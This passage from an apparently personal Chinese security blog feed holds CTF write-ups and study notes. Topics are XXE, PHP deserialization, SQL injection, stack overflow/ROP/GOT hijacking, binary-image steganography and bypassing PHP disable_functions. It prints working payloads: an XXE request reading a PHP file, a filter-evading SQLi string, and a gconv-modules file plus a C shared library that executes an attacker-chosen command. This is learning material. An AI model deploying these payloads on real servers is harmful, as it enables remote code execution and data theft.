<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">132</span> <span class="token operator">==</span> <span class="token string">'132flag'</span><span class="token punctuation">)</span>
    <span class="token keyword">echo</span> <span class="token string">'pass'</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p>输出结果均为pass<br>用0实验不成，猜测可能flag的md5开头为数字，用burp的intruder模块爆破，得到name&#x3D;357时通过验证，回显flag在<code>./_f14g_Is_Here_.php</code>，位于当前目录下，但是我们没有读的办法</p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>现在还不会XML注入，据说payload不用记，临时要用的时候网上搜一把就有了<br>在上传xml的时候要把Content-Type改为application&#x2F;xml<br>大概原理应该是xml被包含之后可执行吧？<br>张师傅的样例报文</p>
<pre><code>POST /message.php HTTP/1.1
Host: 148.70.59.198:41257
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/xml
Content-Length: 188
Origin: http://148.70.59.198:41257
Connection: close
Referer: http://148.70.59.198:41257/

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=_f14g_Is_Here_.php&quot; &gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;request&gt;flag&lt;/request&gt;
&lt;/root&gt;
</code></pre>
<p>xml的格式于json保持一致，定义了一个xml实体并在name处引用<br>不是很懂XML是情况，为什么还能适用PHP伪协议的<br>在xml实体注入读取flag的时候，由于flag藏在php文件中，文件中的&lt;?php中的尖括号会让xml解析错误，无法直接读取，故可以使用filter伪协议以编码方式读出</p>
<p>最后拿到了三叶草的wp，师傅的说法是既然发现他能够解析json格式，就可以猜测其能够解析xml文档，又此处如果判断不过在<code>name</code>处存在对输入名称的回显，将此处替换为xml实体，就可以尝试读取文件了</p>
<p>参考XXE资料: <a href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a></p>
<h2 id="又来一只猫"><a href="#又来一只猫" class="headerlink" title="又来一只猫"></a>又来一只猫</h2><p>很简单的一个反序列化。。。简单的不能再简单，但是还是卡了我十分钟，就是因为那个很坑的私有成员变量<br>比如一个名为Stu的类有一个name的私有成员(private)，那么他在反序列化之后的名字会变为<code>\00Stu\00name</code>，但是本地跑出来的时候那个\00只是一个空格，打过去就不能正常反序列化覆盖默认值，把空格改为\00即可解决，protected的变量反序列化之后应为<code>\00*\00name</code></p>
<h2 id="反引号调用shell-exce函数"><a href="#反引号调用shell-exce函数" class="headerlink" title="反引号调用shell_exce函数"></a>反引号调用shell_exce函数</h2><p>学到的一个新的知识点，PHP中被反引号会调用shell_exce函数达到命令执行的效果，在disable_function中如果禁用了shell_exce函数则反引号同时失效</p>
<h2 id="代码审计一"><a href="#代码审计一" class="headerlink" title="代码审计一"></a>代码审计一</h2><p>贴一下重要部分源码，删去无关部分，能看懂就行</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">"If I knew where I would die, I would never go there."</span><span class="token punctuation">;</span>
    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//"))</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Not allow !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>curl配置项
        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">===</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">==</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string">"Congratulations. Flag is  SYC{********************************}"</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

<span class="token delimiter">?></span>
</code></pre>
<p>难度也不大，不过感觉有点意思，显然是将url导入到自己的服务器上，可以自己进行控制，从而满足要求，应该也算是ctf中的一个常用套路，不过我第一次见罢了（菜），做了就顺手记录一下</p>
<h2 id="乱七八糟的思路"><a href="#乱七八糟的思路" class="headerlink" title="乱七八糟的思路"></a>乱七八糟的思路</h2><p>首先想着是不是能控制自己服务器的回复请求，这样子一个个改包回复就可以完成（太菜了不会实现）<br>然后就是waf师傅说的，把一个文件当数据库，每次访问就pop出第一位出来，这样子完成整个遍历<br>比较菜，写的脚本异常丑陋</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>又踩了一个坑，在服务器上的一个文件权限是需要修改的，不然PHP不能修改文件，用chmod临时改一下，应该有长久之计吧，但是还是菜</p>
<h2 id="SQL注入系列"><a href="#SQL注入系列" class="headerlink" title="SQL注入系列"></a>SQL注入系列</h2><p>都不难，从万能密码到查数据库到替换为空到过滤，算是一次复习，就是最后那个过滤空格的地方让我重新调了一会payload，现在这个无需空格和逗号的payload放一下<br><code>select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database())from(1))));</code><br>当然这里只有一个列，如果有多列要那种1,1,group_concat()的情况的话，考虑一下用join函数继续调整payload</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>大队不愧是大队，后来在上海线下的时候面对面的遇上了三叶草的师傅，其中有一个就是大二的师傅，可以说水平以及远超我一大截了，招新赛虽然很简单的题也多，但是像我记录的这些题还有几个难题实在是做不出来，强校的基础还是比我们好啊，起步晚了，还需努力。</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出简单入门</title>
    <url>/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h1 id="栈溢出简单入门"><a href="#栈溢出简单入门" class="headerlink" title="栈溢出简单入门"></a>栈溢出简单入门</h1><p>别问，问就是闲的<br>所以稍微学一下<br>很水，且基本没用实践过</p>
<h2 id="函数入栈退栈过程"><a href="#函数入栈退栈过程" class="headerlink" title="函数入栈退栈过程"></a>函数入栈退栈过程</h2><p>主要和三个寄存器相关，<code>esp ebp eip</code><br>esp为栈顶指针，指向栈顶，ebp为栈底指针，指向当前栈帧的栈底。eip则保存执行指令的地址<br>这里首先需要理解，栈和代码段是分开的，栈理论上可读可写不可执行，代码段可读可执行</p>
<h3 id="入栈"><a href="#入栈" class="headerlink" title="入栈"></a>入栈</h3><p>栈由高地址向低地址生长<br>caller的栈帧一开始只保存了caller的caller的栈帧底和局部变量<br>懒得画图，就大概是这个样子</p>
<pre><code>caller&#39;s caller&#39;s ebp    &lt;-ebp
local val                &lt;-esp
</code></pre>
<p>当caller进行函数调用时，会先将callee的参数依次压入栈，然后使用CALL命令把当前eip压入栈顶，callee的入口地址放入eip，实现程序流的切换<br>栈就变成这个样子</p>
<pre><code>caller&#39;s caller&#39;s ebp    &lt;-ebp
local val                
arg n
...
arg 1
return addr                &lt;-esp
</code></pre>
<p>这段栈是属于caller的，然后callee入栈，callee中压入caller的ebp并压入自己的局部变量，栈变为</p>
<pre><code>caller&#39;s caller&#39;s ebp
local val                
arg n
...
arg 1
return addr
-----------
caller&#39;s ebp            &lt;-ebp
local vals                &lt;-esp
</code></pre>
<p>用横线分隔了caller和callee的栈</p>
<h3 id="退栈"><a href="#退栈" class="headerlink" title="退栈"></a>退栈</h3><p>callee调用结束后进行退栈，先把局部变量都退掉，再把caller’s ebp这行退掉，退掉的同时把ebp的值指回上一个ebp，就变成这样</p>
<pre><code>caller&#39;s caller&#39;s ebp    &lt;-ebp
local val                
arg n
...
arg 1
return addr                &lt;-esp
</code></pre>
<p>esp指向返回地址，函数调用的的最后一个指令是RET，把esp的指向的值pop到eip上，完成程序流的切换</p>
<pre><code>caller&#39;s caller&#39;s ebp    &lt;-ebp
local val                
arg n
...
arg 1                    &lt;-esp
</code></pre>
<p>这里有一个小小的问题，调用函数的参数似乎没有退栈<br>实际上，因为参数是在caller的栈中，所以其退栈不属于callee的退栈过程，在callee退栈，return addr将控制流交回caller后，caller中会esp+4n来把参数退掉</p>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p>理论上，最简单的ret2shellcode只要理解了上述过程就叫有手就行（我也只会这个）</p>
<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>要利用的先决条件是栈可执行（但是栈本身只是数据，一般来说应该没有可执行的必要）<br>思路也很简单，就是用户输入是放在局部变量里面的，接受字符串，然后字符串的长度超过变量开的空间的长度，覆盖掉后面的数据，被篡改的栈长成这样</p>
<pre><code>shell code
padding....
return addr(shellcode addr)
padding                        &lt;-ebp
local vals(input here)        &lt;-esp
</code></pre>
<p>常见的shellcode应该是用execve这个系统调用打开shell<br>在函数退栈的时候，return addr会放进eip，eip是下一条执行的指令，而这个地址直接指向在栈更高位置的shellcode，执行栈上的shellcode打通<br>padding可以填\x90，对应NOP指令，就是啥也不做直接下一条指令，这样子塞一长串nop的话，return addr那里就不用填的太准确，只要return addr落在NOP上，就能一路NOP到shellcode执行<br>就算开了ASLR，栈的地址会随机变动，但NOP可以很长，经过多次尝试，也有碰撞成功的可能</p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>因为正常人都不会开栈可执行，所以ret2shellcode大概是一个很远古的漏洞，现在应该不会有（吧）<br>更具有普适性的应该是ret2libc这种更先进的漏洞。<br>理论上，C应该没有内置函数？（pwn爷爷和我说的），我们常用的内置函数，如strcpy，system之类的都是来自于libc这个动态链接库，因为他泛用到就像内置函数一样，所以基本上所有的程序都会包含libc。libc属于代码段，可执行，也不会遇到栈上不可执行这样子的问题</p>
<p>只要在libc中找到一个可利用的函数，然后把返回地址直接送到libc上的对应函数就可以辣<br>至于怎么找到system地址呢，不会（如果不开ASLR的话本地调试应该就能拿到吧，开了的话要先拿到动态链接库在本次运行时基地址咯？）</p>
<p>此时应该把栈变成这个样子</p>
<pre><code>addr of &quot;/bin/sh&quot;
padding
return addr(system() addr)
padding                        &lt;-ebp
local vals(input here)        &lt;-esp
</code></pre>
<p>这里稍微考虑一下为什么这样子就能成功执行<br>在callee退栈后，栈变成这样</p>
<pre><code>addr of &quot;/bin/sh&quot;
padding
return addr(system() addr)    &lt;-esp
(ebp已经指向我们写的padding中的奇怪地址了)
</code></pre>
<p>然后退一层return addr，程序走到system函数入口，esp再上一级</p>
<pre><code>addr of &quot;/bin/sh&quot;
padding(return addr of system())                &lt;-esp
</code></pre>
<p>虽然这个是函数退栈时的结果，但此时程序的执行流是执行到system的入口，所以现在应该把栈理解成一个函数刚入栈的情况，这样子esp指向的就是system函数执行结束后的下一条指令地址，而esp+4(32位)就是system的参数<br>（我之前一直以为参数是靠ebp往下减来获取的，然后pwn爷爷和我说是esp往上加，所以这里ebp已经飞了也不影响执行）<br>又因为参数的退栈是在caller中发生的，这里callee退出之后进system了，所以payload中padding的长度不受callee的参数个数的影响</p>
<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>Return Oriented Programming<br>就像反序列化链条一样的巧妙构造方案，通过寻找各种gadget拼凑出一个完整的命令执行。<br>首先需要找到的所有gadget都以RET指令结尾，RET的效果是pop esp到eip，这样子就能进行不同代码间的跳转。</p>
<p>如果只是在不同的ret语句间跳转的话，可以简单地这样进行构造</p>
<pre><code>addr of gadgetn
....
addr of gadget2
addr of gadget1(原ret addr)        
caller&#39;s ebp        &lt;-ebp
padding                &lt;-esp
</code></pre>
<p>这样子就可以在各种各样的ret语句中跳转了，但是就简单的ret，好像并没有实际的意义，所以还需要更为精妙的构造，比如<code>pop eax;ret;</code>就需要在gadget的前面（也就是低位地址上）放好需要pop到eax的数据</p>
<p>参考链接中就提到了运用一系列gadget来启动栈可执行，从而使用shellcode的攻击模式。先通过一系列gadget压入参数，再通过int 0x80进行系统调用（int是interrupt，0x80对应的中断为系统调用），调用125号函数mprotect，修改栈的可执行权限，最后执行shellcode<br>其中<code>push esp;ret;</code>这个指令的感觉就非常棒，不再需要知道栈的地址即可定位到shellcode</p>
<pre><code>shellcode
addr of push esp    &lt;-esp
previous gadget
</code></pre>
<p>当previous gadget执行RET时，addr of push esp被pop到eip中，esp指向shellcode，此时再把esp push进栈，这样栈就变成了这样</p>
<pre><code>shellcode
addr of shellcode    &lt;-esp
previous gadget
</code></pre>
<p>再RET进入eip的就变成了shellcode的地址</p>
<h3 id="劫持GOT表"><a href="#劫持GOT表" class="headerlink" title="劫持GOT表"></a>劫持GOT表</h3><p>关于这个，要先学习一下程序的动态链接<br>程序有动态链接和静态链接之分，静态链接就是把所需要的函数什么的全部打包进一个二进制文件，这样子在没有任何库的情况下，也能正常跑起来，但问题在于占磁盘，如果有一个公有库的话，n个程序就要占用n份空间，且公有库更新会导致所以程序全部重新编译</p>
<p>所以我们使用强有力的动态链接。理论上C上自带的一些函数，如printf,system这些我们默认似乎就能用的函数，也是依赖于C的标准库的，在Linux下就由一个名为libc.so的共享库提供<br>动态链接在程序运行的时候并不会直接把函数加载到内存里，而是在内存里面留几个坑，等第一次调用时再进行加载，这样子有一些错误处理之类的函数本来也就可能用不上，就又节约了一些内存空间<br>为了实现这样的功能，就使用了GOT表和PLT表这两个表</p>
<p>GOT表位于数据段，可读可写，存放的是动态链接函数的实际位置。而PLT表位于代码段，可读可执行，是动态链接函数的入口点，也就是说动态链接的函数调用都来PLT表这里找<br>但PLT表本身在代码段上，在编译时就确定了，在运行时是不可写的，而动态链接是运行时加载，按照常理来说，PLT是无法得知动态链接函数的位置的，所以PLT的每一项都直接指向GOT表的对应项。<br>但是这里有一点不合理，就是PLT指向GOT，GOT存实际地址，PLT似乎非常的多余。实际上这里是为了实现之前提到的运行时加载，函数只有被用到才会被加载。所以GOT表中的每一项在初始化时都直接指回PLT的对应项，第一次调用时因为GOT还没解析成功，回到PLT，PLT的对应项会为该函数的动态加载做好准备，然后jmp到PLT[0]，进行函数的动态加载并将其切入到GOT的对应项。每个函数加载时所需要的参数不一致，所以需要打一个PLT表对每个函数的加载设置一个入口项，不然的话应该就只需要都调回到加载程序就可以了<br><del>图画不动了，看参考链接吧</del><br>从这里也可以看出来，只要将GOT表的表项进行修改，就会导致函数调用的改变，修改常用函数为system之类的危险函数</p>
<p>攻击思路倒并不是很复杂，动手实操就是另一回事了，哈哈完全不会打<br>首先要拿到会被调用的函数A在GOT中表项的地址，也就是PLT中指向GOT的值；其次计算需要调用的恶意函数B在动态链接库中与已知函数A的偏移（这个可以直接静态调试动态链接库就能拿到），获取到A函数的实际地址，加上偏移得到B函数的实际地址；使用ROP链把A函数在GOT中的表项换成B的地址</p>
<h2 id="二进制的简单工具使用"><a href="#二进制的简单工具使用" class="headerlink" title="二进制的简单工具使用"></a>二进制的简单工具使用</h2><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p>程序拖进去直接变成汇编，左边显示函数表，f5反汇编，tab切换反汇编代码和text段显示（大概），若程序开启了地址随机化，则只有后12位地址是固定的，因此IDA也只显示后十二位地址，实际运行时，函数会在偏移上加上该地址<br>如果没开则会直接显示完整地址</p>
<p>pwn爷爷和我说之前讲的函数参数的压栈只针对32位系统，对于64位系统，函数参数由七个寄存器保存，超出七个的参数再进行压栈</p>
<h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>checksec等命令可以看函数开没开保护</p>
<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>首先需要下载无敌的差距，peda或pwndbg，这两个插件可以在调试的时候显示寄存器栈汇编等各种数据，显示效果就很直观<br>目前学了几个简单命令，<code>b *addr</code>十六进制地址下断点，<code>n</code>step over单步，<code>s</code>step into单步，<code>start</code>将程序加载至内存，<code>c</code>开始运行<br>对于开了地址随机化后的程序，需要在ida中拿到段内偏移，然后在start将程序加载后用<code>vmmap</code>查看实际偏移，将偏移和基址加起来得到实际地址</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上）</a><br><a href="https://zhuanlan.zhihu.com/p/25892385">手把手教你栈溢出从入门到放弃（下）</a><br><a href="https://www.linkedin.com/pulse/elf-linux-executable-plt-got-tables-mohammad-alhyari">ELF Linux Executable PLT and GOT Tables</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>二值图像信息隐藏</title>
    <url>/%E4%BA%8C%E5%80%BC%E5%9B%BE%E5%83%8F%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F.html</url>
    <content><![CDATA[<h1 id="二值图像信息隐藏"><a href="#二值图像信息隐藏" class="headerlink" title="二值图像信息隐藏"></a>二值图像信息隐藏</h1><p>本来是一个可以通过百度复制粘贴完成的作业，但是由于没意义的好奇心最后导致我学了一系列乱七八糟的东西并手动实现了一下。。。<br>多谢老国王带我光速进行了基础知识的学习</p>
<h2 id="图片格式"><a href="#图片格式" class="headerlink" title="图片格式"></a>图片格式</h2><p>图片主流格式有jpg png 和 bmp，前面两种都蛮复杂的，有数据压缩之类的的环节<br>可以在010editor里面下一个图片格式模板之类的东西，就能快速解析图片格式了，还挺好用的</p>
<p>bmp格式的图片就比较简单，也是最好分析的，图片头定义了图片的宽和高，再加上一点基本数据就直接是像素点的堆叠了，图像的数据部分就直接是代表每个像素点的字节，所以同样的一张图片，bmp格式就会占用更多的空间，毕竟完全不存在压缩操作</p>
<p>图片也有蛮多类型，二值图像，灰度图像，彩色图像等等</p>
<p>今天学习的是二值图像，就是图像只有黑白两色，图像处理经常会用到灰度图像，就是从白到黑一共256个颜色深度，彩色图像经典的就是RGB图像，其实就是红绿蓝三个色彩通道各自256个颜色深度，叠到一起凑出来256^3种颜色的彩色图像</p>
<p>那么显而易见，二值图像可以用1个bit，也就是一位01来表示一个像素点，灰度图像就需要1个byte，也就是8位01表示256种深度的一个像素点，彩色图像就得3个byte来表示一位像素点了，差不多</p>
<p>bmp为二值图像的时候还有一个很有意思的地方，他会在文件头处有8个字节表示这个图二值是哪两个颜色，0表示前4个字节对应的颜色，1表示后四个字节对应的颜色，如果我们修改这八个字节，他就会展现出别的颜色，比如红蓝的二值图像（原来二值图像不一定是黑白的，只是只有两个颜色而已）<br><img src="/images/%E4%BA%8C%E5%80%BC%E5%9B%BE%E5%83%8F%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/byte.png" alt="byte.png"></p>
<p>试了一下发现jpg格式的好像不支持二值图像，只有bmp和png支持二值图像</p>
<h2 id="二值图像隐写"><a href="#二值图像隐写" class="headerlink" title="二值图像隐写"></a>二值图像隐写</h2><p>原理也非常的简单，因为二值图像纯由黑白两色组成，我们可以把整个图像当成一个01序列，对相邻相同的字符数量(游程)进行统计<br>通过修改游程的奇偶性进行信息隐藏，游程为偶数表示0，游程为奇数表示1<br>把需要隐藏的内容01二进制编码塞进去就行了，因为每段只修改一个像素点，其实也很难被发现，如果图像方方正正的（比如我后面用来实验的是二维码，就有点明显，但是如果随便找个图像再转成二值的，那真是完全看不出来）</p>
<p>写了个垃圾脚本，可以完成二值图像的隐写，网上找的图像就算看上去是黑白的事实上也是RGB图像，所以处理完之后会变成三个图像，其实就是三个通道分开来的效果。并且截图什么的其实都是得到一个RGB图像，不过在后续健壮性测试的时候发现如果RGB图像是纯黑白两色的，在展开到三个通道的时候对应位好像也是全0和1也能把信息恢复出来，真是神奇</p>
<p>工具丢在GitHub上了，抄作业的时候给个star pls<br><a href="https://github.com/Z3ratu1/binary_image_information_hidding">binary_image_information_hidding</a></p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>杂项</tag>
      </tags>
  </entry>
  <entry>
    <title>从ByteCTF到bypass_disable_function</title>
    <url>/%E4%BB%8EByteCTF%E5%88%B0bypass_disable_function.html</url>
    <content><![CDATA[<h1 id="从ByteCTF到bypass-disable-function"><a href="#从ByteCTF到bypass-disable-function" class="headerlink" title="从ByteCTF到bypass_disable_function"></a>从ByteCTF到bypass_disable_function</h1><p>起初只是简单的看了一下去年ByteCTF中那个bypass_disable_fuction的题，然后发现原来PHP有这么多bypass的方案我不知道，以及一些零碎的其他知识点，统一学习了</p>
<p>然后马上蓝帽杯遇到一个bypass发现完全不会做，进行大型update</p>
<h2 id="putenv"><a href="#putenv" class="headerlink" title="putenv"></a>putenv</h2><p>在环境变量可控时执行的两大操作，需要disable_function里面给用putenv</p>
<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>这个是最老的操作之一了，我掌握的也就这一种，通过<code>LD_PRELOAD</code>这个变量可以指定动态链接库(.so文件)在libc之前被加载，编写一个恶意的动态链接库，使用GNU的特殊语法，在调用main函数之前对构造属性进行执行，由于是调的C库这边的函数，自然不受disable_function的影响。只要PHP启动新进程时，恶意动态链接库被加载，且其构造方法直接在一切之前运行，构造方法中写一个命令执行即可。<br>简单的说就是能劫持PHP启动的新进程</p>
<h4 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h4><p>PHP使用mail函数的时候会用execve来启动sendmail，启动进程时成功命令执行</p>
<h4 id="imap-open"><a href="#imap-open" class="headerlink" title="imap_open"></a>imap_open</h4><p>也是一个启动进程的函数</p>
<h4 id="Imagick"><a href="#Imagick" class="headerlink" title="Imagick"></a>Imagick</h4><p>这个库在远古版本是能直接命令执行的，能直接绕过disable function，不过那个也太远古了。但是这个库也能启动新的进程，而非常有意思的一点是，LD_PRELOAD那篇文章的作者却提到他没能在imagick中启动新的进程，不过0CTF2019中的这道Wallbreaker_Easy考的就是这个点（这个题用的FPM模式，估计用FPM也能打通），Imagick再进行图片类型转换时，需要启动外部程序进行转换，这样就会启动新的进程，实现LD_PRELOAD的命令执行，这里放一个替换mail的payload</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readImage</span><span class="token punctuation">(</span><span class="token string">'123.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeImage</span><span class="token punctuation">(</span><span class="token string">'123.wdp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>可以用之前的bypass脚本打通</p>
<h3 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h3><p>这个是ByteCTF的考点，基本原理也是最后的底层实现调用的是C的动态链接库。<br>PHP在使用<code>iconv()</code>时最后一路调用，进入libc函数<code>iconv_open()</code>，再一波操作调用到.so文件的方法，实现RCE<br>同样，系统不会无缘无故的调用我们自己上传的路径下的<code>.so</code>文件，其支持使用<code>GCONV_PATH</code>的自定义编码转换模块，所以可以putenv将该变量设置为目标路径，同时上传两个文件以建立该编码模块并实现利用<br><a href="https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html">glibc iconv文档</a> 讲解了gconv-modules的基本语法</p>
<p>这里默认后缀是.so所以不需要指定.so，默认认为动态链接库和gconv-modules在同一目录下，但是也允许相对目录，编码名后面加的<code>//</code>是glibc实现的问题，文档里说你听他的就行了</p>
<p>gconv-modules</p>
<pre><code>module  PAYLOAD//    INTERNAL    ../../../../../../../../tmp/payload    2
module  INTERNAL    PAYLOAD//    ../../../../../../../../tmp/payload    2
</code></pre>
<p>payload.c，使用<code>gcc payload.c -o payload.so -shared -fPIC</code>编译为payload.so</p>
<pre class=" language-C"><code class="language-C">#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

extern char** environ;

void gconv() {}

void gconv_init() {
    const char* cmdline = getenv("EVIL_CMDLINE");
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = '\0';
            }
    }

    system(cmdline);
}
</code></pre>
<p>此时在iconv中遇到<code>payload</code>编码时，即会调用我们这个恶意的动态链接库完成命令执行</p>
<p>除了<code>iconv()</code>这个函数，所有能最终调用到libc的<code>iconv_open()</code>操作均能触发RCE，比如<code>iconv_strlen</code>，或者<code>php://filter</code>的<code>convert.iconv</code>过滤器等<br>这道题的预期解应该就是用php:&#x2F;&#x2F;filter<br>lfy神仙还提到了可以再套一层LD_PRELOAD劫持system这个函数启动的进程方便执行命令，但是我感觉只要自己把payload里面写好一点靠环境变量作为参数执行命令应该也很方便吧？这里直接抄那个LD_PRELOAD的payload靠环境变量命令执行也很不错</p>
